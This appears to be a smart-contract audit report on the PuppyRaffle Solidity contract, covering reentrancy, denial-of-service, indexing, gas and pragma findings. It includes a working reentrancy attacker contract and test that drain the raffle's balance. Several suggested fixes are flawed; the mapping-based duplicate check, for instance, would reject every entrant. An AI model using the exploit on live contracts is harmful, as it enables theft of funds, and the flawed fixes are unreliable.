### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

​
**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.
​
In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that call do we update the `PuppyRaffle::players` array.
​
```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
​
@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);
​
    emit RaffleRefunded(playerAddress);
}
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and again claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by a malicious participant.

**Proof of Concept:**
​
1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the PuppyRaffle balance.
​
<details>
<summary>PoC Code</summary>
​
Add the following to `PuppyRaffle.t.sol`
​

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;
​
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }
​
    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }
​
    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
​
    fallback() external payable {
        _stealMoney();
    }
​
    receive() external payable {
        _stealMoney();
    }
}
​
// test to confirm vulnerability
function testCanGetRefundReentrancy() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
​
    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);
​
    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
​
    // attack
​
    vm.prank(attacker);
    attackerContract.attack{value: entranceFee}();
​
    // impact
    console.log("attackerContract balance: ", startingAttackContractBalance);
    console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
    console.log("ending attackerContract balance: ", address(attackerContract).balance);
    console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
}
```
</details>

**Recommendation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally we should move the event emission up as well.
​

    ```diff
    function refund(uint256 playerIndex) public {
       address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        - require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    +    players[playerIndex] = address(0);
    +    emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFees);
    -   players[playerIndex] = address(0);
    -   emit RaffleRefunded(playerAddress);
    }
    ```

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.
​
```javascript
// @audit Dos Attack
@> for(uint256 i = 0; i < players.length -1; i++){
    for(uint256 j = i+1; j< players.length; j++){
    require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
  }
}
```

**Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.
​
An attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**
​
If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~6252048 gas
- 2nd 100 players: ~18068138 gas
​
This is more than 3x more expensive for the second 100 players.
​
<details>
<summary>Proof of Code</summary>
​Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function testDenialOfService() public {
        // Foundry lets us set a gas price
        vm.txGasPrice(1);

        // Creates 100 addresses
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < players.length; i++) {
            players[i] = address(i);
        }

        // Gas calculations for first 100 players
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players: ", gasUsedFirst);

        // Creates another array of 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersTwo.length; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        // Gas calculations for second 100 players
        uint256 gasStartTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndTwo = gasleft();
        uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
        console.log("Gas cost of the second 100 players: ", gasUsedSecond);

        assert(gasUsedSecond > gasUsedFirst);
    }
```
​
</details>

**Recommended Mitigation:** There are a few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

```diff
    +    mapping(address => uint256) public addressToRaffleId;
    +    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
    +            addressToRaffleId[newPlayers[i]] = raffleId;
        }

    -        // Check for duplicates
    +       // Check for duplicates only from the new players
    +       for (uint256 i = 0; i < newPlayers.length; i++) {
    +          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
    +       }
    -        for (uint256 i = 0; i < players.length; i++) {
    -            for (uint256 j = i + 1; j < players.length; j++) {
    -                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    -            }
    -        }
        emit RaffleEnter(newPlayers);
    }
    .
    .
    .
    function selectWinner() external {
    +       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use **[OpenZeppelin's EnumerableSet library](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet)**.

### [I-1]: Solidity pragma should be specific, not wide
​
Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`
​
- Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)
​
	```solidity
	pragma solidity ^0.7.6;
	```

# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and players at index 0 causing players to incorrectly think they have not entered the raffle

**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec it will also return zero if the player is NOT in the array.
​
```javascript
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**
​
1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation.

**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.
​
You could also reserve the 0th position for any competition, but an even better solution might be to return an `int256` where the function returns -1 if the player is not active.

# Gas
​
### [G-1] Unchanged state variables should be declared constant or immutable
​
Reading from storage is much more expensive than reading a constant or immutable variable.
​
Instances:
​
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage Variables in a Loop Should be Cached
​
Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.
​
```diff
+ uint256 playersLength = players.length;
- for (uint256 i = 0; i < players.length - 1; i++) {
+ for (uint256 i = 0; i < playersLength - 1; i++) {
-    for (uint256 j = i + 1; j < players.length; j++) {
+    for (uint256 j = i + 1; j < playersLength; j++) {
      require(players[i] != players[j], "PuppyRaffle: Duplicate player");
}
}
```

### [I-2] Using an Outdated Version of Solidity is Not Recommended
​
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.
Recommendation
​
**Recommendations:**
​
Deploy with any of the following Solidity versions:
​
    `0.8.18`
​
The recommendations take into account:
​
    Risks related to recent releases
    Risks of complex code generation changes
    Risks of new language features
    Risks of known bugs
​
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### [I-3] Missing checks for `address(0)` when assigning values to address state variables
​
Assigning values to address state variables without checking for `address(0)`.
​
- Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)
​
  ```javascript
          feeAddress = _feeAddress;
  ```
​
- Found in src/PuppyRaffle.sol [Line: 159](src/PuppyRaffle.sol#L159)
​
  ```javascript
          previousWinner = winner;
  ```
​
- Found in src/PuppyRaffle.sol [Line: 182](src/PuppyRaffle.sol#L182)
​
  ```javascript
          feeAddress = newFeeAddress;
  ```
